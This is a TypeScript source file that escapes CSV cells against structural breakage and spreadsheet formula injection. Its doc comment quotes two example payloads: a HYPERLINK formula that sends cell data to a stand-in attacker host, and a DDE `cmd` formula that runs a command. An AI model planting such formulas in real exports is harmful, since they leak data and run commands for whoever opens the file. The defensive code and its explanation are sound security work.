/**
 * CSV cell encoding.
 *
 * Two distinct problems live here and they need different defences:
 *
 * 1. **Structural** — a comma, quote or newline inside a value shifts every
 *    column to its right in the opened file. Fixed by quoting the field and
 *    doubling any embedded quote.
 *
 * 2. **Formula injection** — Excel and LibreOffice evaluate a cell whose value
 *    begins with `=`, `+`, `-`, `@`, TAB or CR *even when it is quoted*, so a
 *    product named `=HYPERLINK("http://evil.tld?d="&A1,"Click")` becomes a live
 *    link or a live command in whoever opens the export. The realistic path here
 *    is privilege escalation across roles: a cashier who may create customers
 *    names one `=cmd|'/c calc'!A1`, a manager exports the report, and it executes
 *    in the manager's spreadsheet session. Quoting does not stop this.
 *
 * The fix is to prefix a single quote, which spreadsheet applications treat as
 * "this cell is text" and strip on display.
 */

/** Quotes a value so it cannot break the row/column structure. */
export function quoteCsvCell(value: string | number | null | undefined): string {
  const text = value === null || value === undefined ? "" : String(value);

  return `"${text.replace(/"/g, '""')}"`;
}

/** Characters that make a spreadsheet treat the cell as a formula. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Neutralises formula injection, then quotes the value.
 *
 * Leading whitespace is stripped for the *test* only — Excel ignores it when
 * deciding whether a cell is a formula, so `  =1+1` is still evaluated — but the
 * original value is what gets written, prefixed with the text marker.
 */
export function csvCell(value: string | number | null | undefined): string {
  const text = value === null || value === undefined ? "" : String(value);

  const safe = FORMULA_LEAD.test(text.trimStart())
    ? "'" + text
    : text;

  return quoteCsvCell(safe);
}